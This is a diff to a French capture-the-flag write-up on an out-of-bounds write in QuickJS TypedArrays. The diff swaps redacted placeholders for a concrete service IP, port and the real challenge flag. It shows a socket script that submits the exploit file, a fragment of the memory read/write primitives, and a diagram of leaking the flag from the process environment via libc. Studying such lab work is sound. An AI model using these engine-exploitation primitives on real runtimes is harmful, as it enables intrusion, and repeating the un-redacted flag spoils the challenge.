@@ -1,8 +1,8 @@
 # PWN#006 — QuickJS TypedArray OOB Writeup
 
 **Challenge** : PWN#006 (144 pts)
-**Remote** : `<HOST>:<PORT>`
-**Flag** : `CTF{REDACTED}`
+**Remote** : `169.58.126.107:5009`
+**Flag** : `CTF{5e01c02ed9c555d1540b0ecb28222440}`
 
 ---
 
@@ -308,7 +308,7 @@ else{let f=new Float64Array(1),bi=new BigInt64Array(f.buffer);let R=(a)=>{W8(F+0
 python3 -c "
 import socket, time
 with open('e18.js','rb') as f: code=f.read()
-s=socket.socket();s.settimeout(30);s.connect(('<HOST>',<PORT>))
+s=socket.socket();s.settimeout(30);s.connect(('169.58.126.107',5009))
 s.sendall(code+b'\n###RUN###\n');time.sleep(15)
 d=b''
 try:
@@ -319,7 +319,7 @@ try:
 except:pass
 print(d.decode())
 "
-# Output: FLAG=CTF{REDACTED}
+# Output: FLAG=CTF{5e01c02ed9c555d1540b0ecb28222440}
 ```
 
 ---
@@ -370,7 +370,7 @@ print(d.decode())
 │  R(libc_base + 0x1eee28) → pointeur envp                       │
 │  Scan envp[] pour "FLAG" (0x47414c46 en LE)                   │
 │  Lit et affiche la string complète                             │
-│  → FLAG=CTF{REDACTED}                 │
+│  → FLAG=CTF{5e01c02ed9c555d1540b0ecb28222440}                 │
 └─────────────────────────────────────────────────────────────────┘
 ```
 
@@ -379,7 +379,7 @@ print(d.decode())
 ## 10. Flag
 
 ```
-CTF{REDACTED}
+CTF{5e01c02ed9c555d1540b0ecb28222440}
 ```
 
 Stable sur 5 runs consécutifs sur le service remote.
